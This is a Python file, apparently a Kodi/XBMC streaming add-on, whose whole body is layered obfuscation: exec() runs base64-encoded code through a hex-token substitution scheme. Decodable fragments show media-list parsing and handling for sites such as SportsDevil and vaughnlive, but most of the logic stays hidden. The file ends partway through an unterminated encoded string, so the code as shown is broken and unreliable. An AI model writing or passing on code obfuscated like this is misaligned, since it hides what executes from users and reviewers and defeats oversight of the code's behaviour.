exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MmJjKCIxZiAzMTsxZiAyMCIpOzJiYygoMjY3IGM2LGJmOigyNjcgYzMsYixmOjMxLjJiZShjMyxiLGYpKShmZiIoWzAtOWEtZl0rKSIsMjY3IGJkOmM2KGJkLGJmKSwyMC4yNCgiMmUzIikpKSgyNjcgYSxiOmJbM2UoImExIithLjJiKDEpLDE2KV0sIjB8MXwyNjd8Njl8Nzd8NXw2fDFmfDh8OXxhfGJ8YzF8YzV8NDR8Znw0MnxjMnwyYmF8MjdhfGU0fGQ5fDE2fGU3fGQxfDEwMXxmN3xmZXw0ZnwxMDh8NGV8MjZifGZifDEyZXwxMGR8MzV8MTMzfDEyM3wxMTZ8MmN8Mjh8MTE4fDY0fDExMnwxM2J8MTNjfDE1NHwxNDl8NzB8MTU5fDE1YXw3YnwxNGF8MTRifDM2fDE0Y3wxNTV8MTY2fDE0NHwxNjd8MjR8MTRlfDE0NnwxNjB8MTY4fDE2YXwxNzV8MTg1fDgwfDE4OHwxNzd8MmJjfDE5YnwxNmN8MTk3fDE4YXwxN2J8MTk5fDE4Y3wxOTN8MTk0fDE5NXwxNzR8MTcyfDE4NHwxOWZ8MTc5fDJjNnw5ZXwxYWR8MWI3fGI0fDFjZHxhNnwxYjB8MWNlfDFjMXwxYjR8MWMyfDFjM3wxZDF8MWJhfGIxfGEzfGEwfDFkOXxhYnwxYzh8MWM5fDFkYnwxYmR8YmF8NmJ8ZWZ8NzJ8MWY5fGVhfDQ5fDJlfDIxN3wzMXw3OXwyMTB8NmZ8MWUyfDIwM3wyMTN8MWVlfDJkMHxlNnwxZTZ8M2F8MWZjfDJjOXwyM2J8MjNlfDIxYXwyYnwyNDd8MTJmfDIyNXwyNDB8MjJlfDIyZHwyMWZ8MjRhfDExNXwyMzd8OTZ8MjI0fDI5fDIzOHw0NXw1Nnw5YXw1YXw1Y3w2MnxjMHwxOWR8ZTB8ZDd8MTllfDYzfGNmfGQ4fDI3MHwyN2V8MjZhfDI1NHwyNjR8ZGN8Mjc3fDI1NnxlOXxhZnwxZWN8MjkwfGEyfDNlfDI5M3wyYWJ8MmJlfDIwMXwxNWJ8Mjg5fDI4ZXwyOTd8MjhkfDI5YXwxZTh8MjkyfDlkfDdkfGJlfDExYnwyNWN8YmR8MmNmfDJjNXxhNXxiZnwyZDl8YTF8Y2N8Mjg0fDJjN3wyMXwyZDJ8MmMxfDJjOHxlZXwxMzB8MTUyfDJkN3wyNjl8MWYyfGMzfDJiNHxlNXwyNzN8MTM4fDJkNHwyY2V8YzZ8MWRkfDJkOHxjZHwyZGJ8MmRlfDgyfDIwfGZmfDJkfDIyIi4yOSgifCIpKSkKCjJiYygiMWYgMzE7MWYgMjAiKTsyYmMoKDI2NyBjNixiZjooMjY3IGMzLGIsZjozMS4yYmUoYzMsYixmKSkoZmYiKFswLTlhLWZdKykiLDI2NyBiZDpjNihiZCxiZiksMjAuMjQoIjJlMT0iKSkpKDI2NyBhLGI6YlszZSgiYTEiK2EuMmIoMSksMTYpXSwiMHwxfDI2fGEwfDRhfDV8NnxiYXwxN2R8MWU5fGF8MWQyfDQyfDVkfGV8NTZ8Mzh8NGN8MzV8MjJifDIzYXwyMjJ8OTN8N2R8MTg5fDE5fDI3ZHwxN2Z8MTc4fDE4MHw1Znw4Ynw1YXw5ZXw1MnwxY2F8MjBkfDJjNnwxY2N8MWJjfDJhOHwxZmF8ZWV8MmV8MjExfDNhfDJkMHwxMmZ8NWJ8MjFjfDI0MnwxMTV8NDV8MTFifDI2Mnw4MXwyZDV8NjV8NjN8ZDZ8MjY4fDI2M3wzZXwyYTB8MTVjfDlkfDJhNXwyYXwyZDF8MTlhfDI3M3xhZXwyMnxkMnw4MCIuMjkoInwiKSkpCgkJCgkKMmJjKCIxZiAzMTsxZiAyMCIpOzJiYygoMjY3IGM2LGJmOigyNjcgYzMsYixmOjMxLjJiZShjMyxiLGYpKShmZiIoWzAtOWEtZl0rKSIsMjY3IGJkOmM2KGJkLGJmKSwyMC4yNCgiZjYvM2M9IikpKSgyNjcgYSxiOmJbM2UoImExIithLjJiKDEpLDE2KV0sIjB8MXwxMWV8Yjd8NHwyNmJ8ZWV8ZWF8OHw0NXw0OHxifDJiNXwxMDJ8YTR8Mzh8MTB8MWFjfDNhfDFkY3wxNHwxNXwxNnw5M3wyOGJ8NWF8OGZ8Mzd8ZTF8NWN8ZTN8NWZ8YmN8YTJ8NmZ8ZDh8OWR8MjV8NWR8Mjd8MTE5fDgxfDI5fDZhfDI5ZnwyZXwyMGZ8N2F8M2R8NzN8MWVhfDIyfDU2fDE2Ynw4N3xkN3xkY3w4Nnw5Ynw1OXwyNDZ8NTJ8NTR8YWJ8MmJhfGQzfDQ5fDFkZnxlY3wxMzB8NjJ8ZjB8ZDB8NGF8MWYyfDc1fDhifDY1fDRkfGZkfGNifDExZHw5MHw2MHwxMTF8NWJ8MTE3fDEyY3wxMjB8MTNkfDEzZXw2Y3wxMzZ8N2J8MTYzfDE0ZHxkZnxmNXwyYXwyYzl8Yzl8ZDZ8Yzd8MTllfDYzfDFhMHwxNmZ8OGN8ZGJ8ZTl8MWExfGE3fDFhN3wxYTZ8M2J8MWQ3fGIzfDFjNXxhOHw2YnwxZmV8MmIzfDFlY3wyMGJ8MTlhfGI4fDE1Y3xkYXwxMjd8MWU1fDI5Ynw3ZHwyMmN8NWV8MjIxfDI3NXxlYnxkZXwyNWF8MjcyfDgzfDJhMXwxNDF8Mjk4fGZmfDFmM3wyZDZ8MjYyfDkyfDNmfDQ3fDU3fDI2fDJjIi4yOSgifCIpKSkKCjJiYygiMWYgMzE7MWYgMjAiKTsyYmMoKDI2NyBjNixiZjooMjY3IGMzLGIsZjozMS4yYmUoYzMsYixmKSkoZmYiKFswLTlhLWZdKykiLDI2NyBiZDpjNihiZCxiZiksMjAuMjQoIjJhYS8xNys0MC8xYmYrN2U9IikpKSgyNjcgYSxiOmJbM2UoImExIithLjJiKDEpLDE2KV0sIjB8MXw1ZnxiN3w0NHwyY2F8MjYwfDJjOXw4fDE5MnxhfGJ8NWN8ZWV8MmZ8NGN8MTB8MTF8MjFlfDEzOXwxNHwxNXwyZXwxZWR8ZTh8YTN8YjR8NTh8MjNkfGRjfDY4fDZkfDI4YXwxMzB8MmR8MmF8MTZkfGUwfDE5Y3wyN2J8ZDh8ODR8NTl8OWN8MTBmfDU3fDk0fDdkfDFhZXwyNnwyYmF8NDd8NWR8MTQyfGQ3fDZmfDYzfDM5fGRhfDgzfGY0fGU5fDI1N3wxMDR8MTE0fDkwfDYwfDExMXw1YnwxMzJ8Mzd8MTIwfDIzMHwyNDl8M2R8NmN8Mjk1fGRmfDE0ZnwxOTh8MTc2fDFmM3wzMXw4N3wxZjJ8MjdjfDE4ZXwxZTB8MjZlfDY1fDFhNHwxYTV8NTV8YjF8MWE4fDUxfDNifGEyfDI4N3xkNXwxZmJ8NDl8Mzh8ZWN8MjZifDIxNnwxNWJ8ZDJ8MWY4fDFmNnxmMnxlNnw3NnwyYjJ8MjlmfDExZHwyMWR8MTMxfDVlfDI0Y3wyMzZ8NTZ8MjVifDI1ZHxkNHwyYmN8MmEzfDYyfGM3fDI2Y3wyZGZ8Y2Z8YmJ8OGJ8MTQxfDI4Y3xmZnwyMDF8MmFkfGY1fDI5ZXw5M3wxMWJ8MjVhfDkxfDE5YXxkZXwyY2J8MmQ2fDU0fDVhfDJjMHwxZjR8NDh8MjYyIi4yOSgifCIpKSkKCjJiYygiMWYgMzE7MWYgMjAiKTsyYmMoKDI2NyBjNixiZjooMjY3IGMzLGIsZjozMS4yYmUoYzMsYixmKSkoZmYiKFswLTlhLWZdKykiLDI2NyBiZDpjNihiZCxiZiksMjAuMjQoIjFkKzJjYys4ZCsyYzIvMmUyKzJlNiszMisxMGErMTIrMTAzKzI4MCsyODI9PSIpKSkoMjY3IGEsYjpiWzNlKCJhMSIrYS4yYigxKSwxNildLCIwfDF8MnwzfDNhfDV8Yzh8MTIyfDh8ZWV8YXw1OXxjfDE1N3w1ZHw3Y3wxMHw5M3wxMmF8ZjF8MjU5fDkyfDQ3fDE2NXwxOHwyMnw2MXw0NnwxOWN8NWN8ZTN8MTJkfDEyMXwyY3w4OXwxODJ8NDF8YzR8NGJ8ZDB8M2J8YTZ8ZjV8MjRmfDhhfDhmfDNmfGEyfDMwfDIyOHwxMWF8NzZ8MjZ8YTl8MWZhfDZlfDJhfDEyNHwxMWZ8MWUxfDI5NHwxOGJ8NzV8MTkxfDQ4fGZjfDUyfDU0fGIyfGFhfGI5fDEzYXw1NnwyODZ8MTI2fGUxfDExMHwxOTB8MzV8NjZ8NTB8MTNmfDNkfDE1NnxlZHw3OHwxNTh8MTQ3fDE2NHxkYXwxNjF8NzR8NDl8N2R8MTUxfDE4NnwxMzB8Mjc4fDVmfDE4ZHwxOGZ8MTZlfDhlfDg4fGRifDE3ZXxhY3w5NHw5NXw5ZnxiNXxiMHwxYWF8MWM3fDFiNnwxZDh8MmJhfDFkZXw0M3wyYjN8ZWJ8MmV8Y2Z8MWZkfGRmfDIwNXwyMDd8ZGR8ZmF8NGR8Zjl8MmI2fDEwY3wyMzJ8MjFifDJjYXwxMzF8NTd8MTI5fDExM3wzN3wyMjZ8MjRifDEyYnwyMzF8MjQ1fDI0M3wxMDd8MmE5fDNlfDE0M3wxNWR8MTUwfDczfGQ2fDE4N3w2MnwxODN8MTlkfDhjfDdmfDgxfDE3M3w2NXxlOHwxOTZ8MWEyfDFhM3w1NXwxYjF8MWJifDFjYnw1MXxiNnwxYjl8MWQ2fGIzfDFjNnxhOHwyMDl8MjBhfDE1Y3w3OXxjZXxlMnwxZWZ8N2F8MWZmfDIwNnwyYzR8MjAyfGNhfGI4fDIxNXwxZjB8MWU0fDIwMHwxZTd8MmQwfDFmN3wyMTh8MjE5fDExY3wyNDR8MTE0fDVlfDVifDIyZnwxMzR8MjMzfDIzZnw5NnwyOXwyNTB8MTdkfDQ1fDI1MXw1YXwzOHwyNWV8Yzd8MjVmfDI3NnwyNzF8OGJ8MjUyfDI3NHxjOXw4M3wyNTV8MjY1fDI1OHwyNjZ8NjN8MTQyfDJhMnwyMGN8OTd8MmEzfDJhY3wxNWJ8MmE2fDFmMXwyOGZ8MWU4fDJiMXwyYzN8MTFifDJiZnwxZjN8MzF8ZmZ8MjYxfDI3OXwyYjl8MmQzfDEwMHwyY2R8OWR8MmRhfDJjOXxkNCIuMjkoInwiKSkpCgkKMmJjKCIxZiAzMTsxZiAyMCIpOzJiYygoMjY3IGM2LGJmOigyNjcgYzMsYixmOjMxLjJiZShjMyxiLGYpKShmZiIoWzAtOWEtZl0rKSIsMjY3IGJkOmM2KGJkLGJmKSwyMC4yNCgiMjMvMWM0LzcvMzMvMWUvMzQvMjgxLzEzKzFiKzIxNCsyZTQvNjcvMWMrMWEvZC8yN2YrMjM5KzJiOD0iKSkpKDI2NyBhLGI6YlszZSgiYTEiK2EuMmIoMSksMTYpXSwiMHwxfDJ8MTg2fDkzfDVkfDNhfDEwNXw4fGQ0fGF8NWN8OTZ8NjV8Zjh8MmRjfDE2OXwxMXwyY3wyOWZ8MmM5fDJhfDEyNHw2MXwxOHwxOXwxN2N8MTMwfDlkfGRhfGY1fGRmfDU5fGUzfGM5fGQwfDRifDI5NnxhYXwxYjV8MTA5fDM4fDEyOHwyY2F8MTJhfGEyfDIzNXwyMjd8MzB8NDV8MWFmfDFjMHxlMHxlOHw3MHw2ZXwxNWZ8MTUzfDExZnw5MHw2Ynw2Mnw0OHwxNzF8MjA4fDI4M3wyMGV8MTA2fDJiNnxhN3w1NXwyOWN8MTBifDEzNXw2NnwxN2V8MmV8MjBjfDcxfDE0NXwxNDB8MTcwfDg1fDUzfDVmfDE4ZHw3Znw4ZXw4M3xlMXwyODZ8OTR8OTh8MTEzfDI0ZXw3ZHxhZHwxYjN8M2J8YjZ8Yjl8MWRhfGIyfDQxfDQzfDQ2fDMxfDdhfGYyfGYzfDI5OXw0ZnwzZnw0ZXwxMGV8MTI5fDJifDIyM3wyMzR8NjR8ZWV8MTM3fDE0OHwyYTR8Nzh8Mjg4fGZmfDE1ZXw3Y3wyYWZ8MTYyfDg5fDE5MHwyNTN8MTgxfDgxfDFiZXxiMHwxZDR8MWQwfDUxfDFiOHwxZDV8MWQzfDFiMnxhY3wxYWJ8MWE5fDFjZnwyODV8MWY1fDFlM3wyMDR8OTl8ZTJ8MWYxfDIwYXxjZXxlZnwyNzl8MjYxfDIxMnwxZWJ8MjkxfDI2MnwyYTd8ZGR8MTFjfDIyYXwyM2N8MTBjfDEwZnw1N3wyMjB8NWV8MjQxfDI0OHwxMzR8MjRkfDIyOXwyOXxkNXxlYnwxODd8NzZ8MjZkfDI2Znw5MnxkYnwxMjV8MmIwfDE0MXwxNDJ8MmUwfDJhZXwyOWR8MjE4fDExYnwyYjd8MjVjfDE5YXwxN2F8MmEzfDJiYnxjOHw0N3wyYmR8MmU3fDc1fDJkZHxlZHw3OXwyZTUiLjI5KCJ8IikpKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|2|3|4|5|6|KVtcY2FcN2VdKyhbXlxjYV0rKScpLjQ2KDY0KQoJMTYgPSAxZSg1YikKCTIwICcxNiBjMCBhZScsMTYKCTFkIDNhLDI0LDE3IDFiIDViOgoJCTc4ICc5Yy01NScgMWIgM2E6CgkJCTcwID0gNzMoM2EsJzljLTU1PVtcJyJdKC4qPylbXCciXScpCgkJCTc4IDcwOgoJCQkJNzggNzAuMmIoJzU4Jyk6CgkJCQkJNzAgPSA3MAoJCQkJCgkJCQlkIDFmIDMxLjEyKCc1NS00YScpID09ICIiOgoJCQkJCTU3ID0gMzEuMTIoJzU1LTRhJykKCQkJCQk3MCA9IDU3ICsgNzAKCgkJCQliOgoJCQkJCTcwID0gNzAKCQkJI2I6CgkJCQoJCWI6CgkJCTcwID0gJycKCQk3OCAnODQnIDFiIDNhOgoJCQkzNyA9IDczKDNhLCc4ND1bXCciXSguKj8pW1wnIl0nKQoJCQk3OCAzNyA9PSAnYTAtOWYnOgoJCQkJMTcgPSAxNyArIiYyMj0xOCIKCQkJZCAzNyA9PSAnNWQnOgoJCQkJNCA9IDE3LmI0KCcmZDI9JykKCQkJCSMyMCA0WzBdIDYyKDQsNTQ9NSkKCQkJCWQyID0gNDQoNjIoJycsNTQ9NFsxXSkpCgkJCQkKCQkJCTI2KDRbMF0sIDI0LDcwLCcnLCcnLCcnLCcnLCcnLDUsZDIsMTYpCgkJCQk1NgoJCTI2KDE3LCAyNCw3MCwnJywnJywnJywnJywnJyw1LCcnLDE2KQoKNWYgNTIoMzQsNjEpOgoJNDAgPSAiIgoJMWM6CQoJCTY1ID0gNmEuNDYoNjEsMzQsIGIzPTZhLmI1KQoJCTQwID0gNjVbMF0KCTY6CgkJNDAgPSAiIgoKCTRjIDQwCgkKNWYgNjcoMzQsIDQ5LCA1MSk6Cgk3ZSA9IDZhLjQ2KCIoPzEzKSgiICsgNDkgKyAiW1xjMVxhNF0rPyIgKyA1MSArICIpIiwgMzQpCgk0YyA3ZQkJCQkKCjVmIDY4KDM0LCAyOCwgMzgsIDUwPTNkKToKCTc4IDUwOgoJICAgMWM6IDdlID0gNmEuNmMoIig|8|9|a|b|c|OTg9NGImNDE9JysxMy4yOQoJCQkJCQkJYjoKCQkJCQkJCQk0MSA9ICdkMzovL2QzLmMuOTcvYjEvYzYnKzEzLjI5KycvNGInCgkJCQkJCQk0LmQwKDQxKQkJCQkJICAKCQkJCWQgMWUoMygnNDcnKSkgPjA6CgkJCQkJCTFkIDEzIDFiIDMoJzQ3Jyk6CgkJCQkJCQk3OCAxZiAxMy4yOSA9PSA1OgoJCQkJCQkJCTc4ICcuNDcnIDFiIDEzLjI5OgoJCQkJCQkJCQk0NyA9ICdkMzovL2QzLmMuMzYvPzQ9JyszYy4yYSgxMy4yOSkKCQkJCQkJCQlkICcuYmEnIDFiIDEzLjI5OgoJCQkJCQkJCQk0NyA9ICdkMzovL2QzLmMuMzYvPzQ9JyszYy4yYSgxMy4yOSkrJyYyNTs0OD1jMycKCQkJCQkJCQkJCgkJCQkJCQkJYjoKCQkJCQkJCQkJNDcgPSAnZDM6Ly9kMy5jLjM2Lz80PScrM2MuMmEoMTMuMjkpKycmMjU7NDg9OTYnCgkJCQkJCTQuZDAoNDcpCgkJCQlkIDFlKDMoJzZlJykpID4wOgoJCQkJCTFkIDEzIDFiIDMoJzZlJyk6CgkJCQkJCTc4IDFmIDEzLjI5ID09IDU6CgkJCQkJCQk2ZSA9ICdkMzovL2QzLmMuZi5kNC5kMS8|e|f|10|11|JykKCQkJNTkgYSA2MCA1MzoKCQkJCTE0ID0gNzYoYSwgJzwxYj4nLCAnPC8xYj4nKQoJCQkJIzEwNSA9IDc2KGEsICc8MTA1PicsICc8LzEwNT4nKQoJCQkJI2IgMTA1ICsgJwknICsgMTQKCQkJCTkgMmEoMTQpID4gNToKCQkJCSAgIDEzID0gMTMgKyAxCgkJCQkgICAyYi4zZSgxNCkKCQkJCSAgICNiICc4NSBhNjogJysgMzYoMTMpICsnIDogJysgMTQgCgoJCQk1OCA9IDI0KDcsICc8NWY|JwoJCQk2OgoJCQkJMTUoJ2I2IDVlJykKCQkJCTkgPSAnJwoKCgkJCTFjOgoJCQkJNzggMygnN2QnKToKCQkJCQk3OCAzLjMzOgoJCQkJCQkxNSgnYzIgYTMgYWQnKQoJCQkJCQkzMyA9IDMuMzMuMjkKCQkJCQkJMzkgPSAzLjM5LjI5CgkJCQkJCTNmID0gOGIoMzMsIDM5KQoJCQkJCQk3OCAzZjoKCQkJCQkJCTkgKz0gJyAtICcgKyAzZgoJCQkJCWQgMygnN2QnKVswXS4yOSA|14|15|16|MWYnCgkxOCA9IDRmKDU4KQoJMTggPSAxOC45NSgnLzdlJywnJykKCTE4ID0gMTguNjUoJzYxLTgnKS4zMygnNjEtOCcpLjk1KCcmIzM5OycsJ1wnJykuOTUoJyYjMTA7JywnIC0gJykuOTUoJyYjNzQ7JywnJykKCTJlPTUyLjVmKCI8MmQ|18|19|MDoKCQkJCQkxZCAxMyAxYiAzKCc0MScpOgoJCQkJCQk3OCAxZiAxMy4yOSA9PSA1OgoJCQkJCQkJNzggMzEuMTIoJzVjJykgPT0gJzAnOgoJCQkJCQkJCTQxID0gJ2QzOi8vZDMuYy44YS8|IDE6CgkJCQkJCTkgKz0gYTIoMygnN2QnKVswXS4yOSkKCQkJCWI6CgkJCQkJNTkKCQkJNjoKCQkJCTE1KCdhMyA1ZScpCgkJCTFjOgoJCQkJNCA9IFtdCgkJCQk3OCAxZSgzKCczNScpKSA|Jjc1PThkJjQzPScgKyAxMy4yOQoJCQkJCQkJYjoKCQkJCQkJCQkyZiA9ICdkMzovL2QzLmMuNDUvNGIvPzQzPScgKyAxMy4yOSAKCQkJCQk0LmQwKDJmKQoJCQkJZCAxZSgzKCc0MScpKSA|NWQgNDIoMTEsMTA0KToKCWIgJzExLTQyJywxMQoJMjUgPSAiMmIiCgkgCgkxYyA9IDI4KDExKQoJI2IgNGQoMWMpCgk5IDhjKDFjLDc0KToKCQk5IDJhKDFjKCc5OCcpKSA|KSIgKyAzOCwgMzQpLjc0KDEpCgkgICA2OiA3ZSA9ICcnCgliOgoJICAgMWM6IDdlID0gNmEuNmMoIig|import|base64|aHR0cDovL2Rpai5kaWplbnRlcnRhaW5tZW50cy5jby51ay9saXN0cy94bWwvaG9tZS54bWw|dijentertainments|NWYgNzIoNTQsODApOgoJNjQgPSA1NC45YSgpCgk1YiA9IDZhLjhjKDdlJyM5ZDooLis|b64decode|25|executebuiltin|27|28|split|addon_log|group|getSetting|BeautifulStoneSoup|return|AKfycbyBcUa5TlEQudk6Y_0o0ZubnmhGL_|30|re|IDEwOgoJCQk1MyA9IDI0KDcsICc8NmE|MTMpIiArIDI4ICsgIihbXGMxXGE0XSs|MTMpKCIgKyAyOCArICJbXGMxXGE0XSs|xbmcplugin|36|isinstance|string|39|except|getSoup|JykKCSAgICAxYS43NCgpCgkgICAgNiAoMWEuNGUoKSA9PSA1Mik6CgkJMmQKCSAgICAyZSA9IDFhLjc2KCkKCSAgICA2IDYxKDJlKSA9PSAwOgoJCTJkCgkgICAgNTAgPSB7fQoJICAgIDUwWyc5NyddID0gMmUKCSAgICA1MFsnMTcnXSA9IDVjCgkgICAgNTBbJzYzJ10gPSA2MwoKCTYgNGEuMjMuMjIoNSk9PTUyOgoJICAgIDE4ID0gW10KCSAgICAxOC40Yig1MCkKCSAgICBiID0gMzgoNSwiOTIiKQoJICAgIGIuNTQoMzcuNTgoMTgpKQoJICAgIGIuNTUoKQoJMWQ6CgkgICAgMyA9IDM3LjUxKDM4KDUsIjkwIikuNjgoKSkKCSAgICAzLjRiKDUwKQoJICAgIGIgPSAzOCg1LCI5MiIpCgkgICAgYi41NCgzNy41OCgzKSkKCSAgICBiLjU1KCkKCTkuODAoJ2UnLCAiIikKCTkuODAoJ2MnLCAiIikKCTM0Ljk4KCI0Yy40OSgzMyw4MiAyZiA4Ni4sODcsIisxOSsiKSIpCgk2IDYwIDE3IDdjIDI2OgoJICAgIDYgJzM2LjhhLjQ0Ljg5JyA0NSAxNzoKCQkzNC45OCgiNGMuMzAuNDMoJTkzPzY0PTE0LDNlKSIgJTdlLjY1WzBdKQoJICAgIDRkICc1Yi04NScgNDUgMTc6CgkJMzQuOTgoIjRjLjMwLjQzKCU5Mz82ND0xMCwzZSkiICU3ZS42NVswXSkKCTFkOiA5LjQxKCk|Container|int|thumbnail|KC4rPyk8LzJkPi4rPzwzMD4oLis|regex_get_all|addon_version|regex_from_to|BeautifulSoup|addon|externallink|encode|addDir|decode|Notification|channel_name|makeRequest|isConfirmed|resolve_url|SportsDevil|50|compile|getData|53|replace|findall|xbmc|title|b7Up8kQt11xgVwz3ErTo|print|icon|close|else|None|links|data|filesystem|stream_url|True|read|vaughnlive|elif|folderPath|ND01ODovL2JmLjc5LmM1L2I5LycrMTMuMjkrJyYyNTszNT05OSYyNTsyMj00ZicKCQkJCQkJCWI6CgkJCQkJCQkJMmUgPSAnZDM6Ly9kMy5jLmE1LjJlLz80PScrMTMuMjkrJyYyNTszNT05OSYyNTsyMj00ZicKCQkJCWQgMWUoMygnYTAtOWYnKSkgPjA6CgkJCQkJMWQgMTMgMWIgMygnYTAtOWYnKToKCQkJCQkJNzggMWYgMTMuMjkgPT0gNToKCQkJCQkJCTg1ID0gMTMuMjkgKyAnJjIyPTE4JwoJCQkJCQkJNC5kMCg4NSkKCQkJCWQgMWUoMygnMmYnKSkgPjA6CgkJCQkJMWQgMTMgMWIgMygnMmYnKToKCQkJCQkJNzggMWYgMTMuMjkgPT0gNToKCQkJCQkJCTc4IDFlKDEzLjI5KSA9PSAxMToKCQkJCQkJCQkyZiA9ICdkMzovL2QzLmMuNDUvNGIvPzg2PScrIDEzLjI5IAoJCQkJCQkJZCAxMy4yOS4yYignY2UnKSA5YiAxZiAnJjc1PScgMWIgMTMuMjkgOgoJCQkJCQkJCTJmID0gJ2QzOi8vZDMuYy40NS80Yi8|getCommunitySources|g_ignoreSetResolved|browse_xml_database|urllib|community|573185581745889283|mode_type|exists|f4mTester|ask_playlist_items|72|resources|getSubChannelItems|append|ignore|HTTPErrorProcessor|use_thumb|plugin|source|favorites|Searchkey|def|Iiw1Mi42MykuNWMoMTgpWzE6XQoJM2EgMTcsIDIwIDIxIDJlOgoJICAgIDE3ID0gMTcuMzMoJzc1JywgJzcwJykKCSAgICAyMCA9IDIwWzotMTVdCgkgICAgMjAgPSAnWzFjIDU1XVs4Ml0nKzIwKydbLzgyXVsvMWNdJwoJICAgIDI1ID0gMjUrMjArJ1w3ZScrMTcrJ1w3ZScrJ1w3ZScKCTUwKCdbMWMgNTVdWzgyXUAyYlsvODJdWy8xY10nLCAyNSkKCTgxKCkKCgoyZiA2MCg4ZCwyPTM0KToKCTJhICc1YicsOGQsMgoJZCA4ZC41KCczYjovLycpIDUxIDhkLjUoJzQwOi8vJyk6CgkgICAgMiA9IGYoOGQpCgkgICAgZCA1Mi42ZSgiIzk4IiwyKSA1MSAnMzUnIDIxIDhkOiAKCQkyYSAnMmMgMzUgMicsMgoJCTE2IDIKCQkKCTU5IDIgPT0gMzQ6CgkgICAgZCAxYS4zNyg4ZCk6CgkJZCA4ZC41KCI2MjovLyIpIDUxIDhkLjUoIjhjOi8vIik6CgkJICAgIDI3ID0gMWEuMjcoOGQsIDU0LjI4LjNkKDE5LCAnM2UnLCAnMTMuNGMnKSkKCQkgICAgZCAyNzoKCQkJMiA9IDFkKDU0LjI4LjNkKDE5LCAnM2UnLCAnMTMuNGMnKSwgIjg4IikuMzgoKQoJCQkxYS42ZCg1NC4yOC4zZCgxOSwgJzNlJywgJzEzLjRjJykpCgkJICAgIGM6CgkJCTIzKCI2YiA4ZSAyNyA4MyA2MjoiKQoJCWM6CgkJICAgIDIgPSAxZCg4ZCwgJzg4JykuMzgoKQoJCSAgICBkIDUyLjJlKCIjOTgiLDIpNTEgJzM1JyAyMSA4ZDogCgkJCTJhICcyYyAzNSAyJywyCgkJCTE2IDIKCSAgICBjOgoJCTIzKCI3YSA3YiA0ZCAyYyEiKQoJCTE2CgkxNiAzMigyLCA5MD0yMi4zYyk|continue|response|true|SimpleDownloader|http|get_xml_database|FindFirstPattern|browse_community|xbmcplus|SetViewThumbnail|getItems|addDirectoryItem|XBMC|Keyboard|IDA6CgkJCTNmID0gMWMoJzZhJykKCQkJNTkgNmEgNjAgM2Y6CiMJCQkJYiA2YQoKCQkJCWQ9JycKCQkJCTNiPTAKCQkJCTEwMjoKCQkJCQlkID0gIDZhKCcxYicpWzBdLmRhCgkJCQkJM2I9MmEoNmEoJzFiJykpCgkJCQk0OiA0YgoJCQkJI2IgJ2QnLGQsM2IKCQkJCTkgM2I|logo_url|keyboard|False|convertEntities|genre|url|match|getChannelItems|video|KeyboardMessage|genesisorpulsar|99|9a|community_files|dijentertainmen|try|Windows|SearchChannels|headers|0x|utf|profile|new_url_source|https_response|xbmcgui|youtube|getText|thumbnailImage|addLink|history|channel|PlayLiveStream|endOfDirectory|af|problem|SOURCES|sublink|doModal|xbmcvfs|DialogProgress|streams|sources|credits|content|urllib2|HTML_ENTITIES|channels_info|m|http_response|y|translatePath|functions_dir|NoRedirection|o|SetViewLayout|list_revision|p|list|fanArt|mode|channel_list|source_media|cc|IyAtKi0gOTU6IDQ5LTggLSotCmJkIDg5CmJkIDI0CmJkIDVlCmJkIGM4CmJkIDE3CmJkIDNkCmJkIDgxCmJkIDFjCmJkIDc3CmJkIDU3CmJkIDUxCmJkIDJkIAo2YSBkLjkzLjQgYmQgOWMKNmEgZSBiZCAxOSwgZSwgMjkKYzM6CgliZCA2MAo5ZjoKCWJkIDQyIGIzIDYwCmJkIGEgYjMgYgpiZCBiNQpiZCA2NwoKCjQgPSA5Yyg0Mz0nNzgvNS4wICg3NCBjZCA2LjEpIDM4Lzk0LjM2IChhMCwgYjkgYTcpIDliLzI4LjAuYjAuNzIgOGQvOTQuMzYnKQo3NiA9IHsKCSc5OCcJOiAgICdiMi9iNiwxMy9hNCs5NiwxMy85NjtjNj0wLjksYTEvYWUsKi8qO2M2PTAuOCcKCX0KCQozNz1bJzU5LmQ1JywgJzM0LjQnLCAnNGUuNCcsICczMS5kNScsICczOS4zYScsICc2Zi40JywgJzg2LmQ1JywgJzViLmM3JywgJzU4LmNlJywgJzdkLjNlJywgJzczLmQ1JywgJzQ4LjNlJywgJzQxLjNlJywgJzcxLmQ1JywgJzY2LmQ1JywgJzY4LmQ1JywgJ2JhLjFhLmQ1JywgJ2I4LjFhLmQ1JywgJzUzLjFhLmQ1JywgJzE1LmQ1JywgJzE1LjNlJywgJzRiLmQ1JywgJzQ3LjQnLCAnN2EuM2EnLCAnN2IuOWQnLCAnNWEuY2YnLCAnMzMuOTInLCAnZDIuMzMuOTInLCAnNjUuZDIuMzMuOTInLCAnMmIuZDUnLCAnZDAuYzQnLCAnODcuZDUnLCAnMzAuNCcsICczMC4zZScsICc4OC5kNScsICc5MS42ZScsICc3MC5kNScsICc1ZC5jOScsICc5Ny4zYScsICcyMC5kNScsICcxMi5kNScsICc5OS5jYycsICczZi5kNScsICcxNC40JywgJzFmLjQnLCAnNDQuM2MnLCAnMjAuZDUnLCAnMTIuZDUnLCAnOTkuY2MnLCAnM2YuZDUnLCAnMTQuNCcsICcxZi40JywgJzU2LmQ1JywgJzdlLmQ1JywgJ2I0LjlkJywgJzVmLjNhJywgJzgwLjZlJywgJzZkLjZlJywgJzZjLjQnLCAnODUuZDUnLCAnYTMuZDUnLCAnMmEuNCcsICc3Yy5kNScsICdkNi1iNy5kNScsICdhNi5kNScsICc3NS5kNScsICc1NS4zYycsICc4Mi40JywgJzc5LjQnLCAnYWIuNmUnLCAnYTIuM2MnLCAnYWEuZDUnLCAnY2EuZDUnLCAnNTQuZDUnLCAnNDYuZDUnLCAnNGEuZDUnLCAnNTAuM2MnLCAnNGYuZDUnLCAnNTIuZDUnLCAnYzEuZDEnLCAnOGMuOWQnLCAnNGQuM2EnLCAnNjMuY2InLCAnODQuYmYnLCAnOTAuYWYnXQoxNj1bJ2Q3LmMuMmMnLCdkNy5jLjRjJywnZDcuYy4zMicsJ2Q3LmMuMzUnLCdkNy44YS40NS4zYycsJ2Q3LmMuYWMtYTgnXQoKYTkgYWQoMjQuMTgpOgogICBjNSBmKGJiLCA3ZiwgMWUpOgoJICAgOGUgMWUKICAgMjEgPSBmCgkgICAKOWEgPSAnMj0nLjFiKCcyZCcpCgpkID0gMWMuYTUoJ2Q3LmMuMWQnK